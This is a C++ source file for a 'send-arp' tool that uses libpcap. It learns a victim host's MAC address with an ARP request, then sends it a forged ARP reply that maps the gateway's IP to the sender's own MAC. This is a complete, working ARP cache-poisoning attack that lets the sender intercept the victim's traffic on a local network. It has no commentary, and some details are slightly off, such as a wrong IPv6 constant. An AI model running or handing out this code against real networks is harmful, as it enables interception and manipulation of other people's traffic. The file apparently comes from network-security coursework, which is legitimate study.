#include <netinet/ether.h> // for struct ether_header
#include <netinet/in.h>  //for ntohs
#include <stdio.h>  //for pragma pack
#include <pcap.h>
#include <sys/socket.h> // get_mac
#include <sys/ioctl.h>  // get_mac , get_ip
#include <linux/if.h>   // get_mac
#include <netdb.h>      // get_mac
#include <stdio.h>      // get_mac
#include <string.h>     // get_mac

#include <string.h>     // get_ip
#include <arpa/inet.h>  // get_ip , inet_ntop
#include <stdlib.h> // for exit()

/* netinet/ether.h
struct ether_header {   // size: 14byte
    uint8_t ether_dhost[6];
    uint8_t ether_shost[6];
    uint16_t ether_type;
};
*/

#pragma pack(push, 1)
struct arp_header {
    uint16_t hrd_t;
    uint16_t pro_t;
    uint8_t hrd_len;
    uint8_t pro_len;
    uint16_t op;
    uint8_t src_mac[6];
    uint8_t src_ip[4];
    uint8_t dst_mac[6];
    uint8_t dst_ip[4]; ;
};
#pragma pack(pop)

typedef enum {
    ETHER = 1,
    Ip4 = 0x0800,
    Arp = 0x0806,
    Ip6 = 0x06DD,
    Requset = 1,
    Reply   = 2,
}type;

struct  EtherARPpacket {
    ether_header eth_;
    arp_header arp_;
};


void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.35.203 192.168.35.1\n");
}


int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* senderIP = argv[2];
    char* gatewayIP = argv[3];
    int i;
    char v_mac[6];

    struct ifreq s;
    uint8_t mymac[6];
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (i=0;i<6;i++) {
            mymac[i] = s.ifr_addr.sa_data[i];
        }
    } else {
        printf("!!! getmac error !!!\n");
    }

    struct ifreq ifr;
    uint8_t mip[4];
    struct sockaddr_in *sin ; //= (struct sockaddr_in *)&their_addr;
    int n = socket(AF_INET, SOCK_DGRAM, 0);

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (0 == ioctl(n, SIOCGIFADDR, &ifr)) {
        sin = reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
        u_char *myip = (u_char *)&sin -> sin_addr.s_addr;
        memcpy(&mip[0],myip,4);
    }
    else {
        printf("!!! myip error !!!\n");
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    static const int MACsize = 6;
    static const int IPsize = 4;

    EtherARPpacket reqpacket;

    for (i=0;i<6;i++) {
        reqpacket.eth_.ether_dhost[i] = 0xff;
    }
    memcpy(&reqpacket.eth_.ether_shost,&mymac,6);
    reqpacket.eth_.ether_type = htons(Arp);

    reqpacket.arp_.hrd_t = htons(ETHER);
    reqpacket.arp_.pro_t = htons(Ip4);
    reqpacket.arp_.hrd_len = MACsize;
    reqpacket.arp_.pro_len = IPsize;
    reqpacket.arp_.op = htons(Requset);
    memcpy(&reqpacket.arp_.src_mac,&mymac[0],6);
    memcpy(&reqpacket.arp_.src_ip, &mip[0], 4);
    for (i=0;i<6;i++) {
        reqpacket.arp_.dst_mac[i] = 0x00;
    }
    inet_pton(AF_INET,senderIP,&reqpacket.arp_.dst_ip);

    int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&reqpacket),sizeof(EtherARPpacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf(" pcap_next_ex error \n");
            return -1;
        }

        struct ether_header *ether;
        ether = (struct ether_header*)packet;
        u_short eth_type;
        eth_type = ntohs(ether->ether_type);

        if(eth_type == Arp){
            packet += sizeof(struct ether_header);
            struct arp_header* arp;
            arp = (struct arp_header*)packet;
            if (ntohs(arp->op) == Reply) {
                for (i=0;i<6;i++) {
                    v_mac[i]=ether->ether_shost[i];
                }
                break;
            }
            else {
                printf("Not Reply...%x\n",arp->op);
                return 0;
            }
        }
        else {
            printf("Type is not ARP ...\n");
        }
    }


    EtherARPpacket reppacket;

    memcpy(&reppacket.eth_.ether_dhost,&v_mac[0],6);
    memcpy(&reppacket.eth_.ether_shost,&mymac[0],6);
    reppacket.eth_.ether_type = htons(Arp);

    reppacket.arp_.hrd_t = htons(ETHER);
    reppacket.arp_.pro_t = htons(Ip4);
    reppacket.arp_.hrd_len = MACsize;
    reppacket.arp_.pro_len = IPsize;
    reppacket.arp_.op = htons(Reply);
    for (i=0;i<6;i++) {
        reppacket.arp_.src_mac[i] = mymac[i];
    }
    inet_pton(AF_INET,gatewayIP,&reppacket.arp_.src_ip);
    for (i=0;i<6;i++) {
        reppacket.arp_.dst_mac[i] = v_mac[i];
    }
    inet_pton(AF_INET,senderIP,&reppacket.arp_.dst_ip);

    res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&reppacket),sizeof(EtherARPpacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}
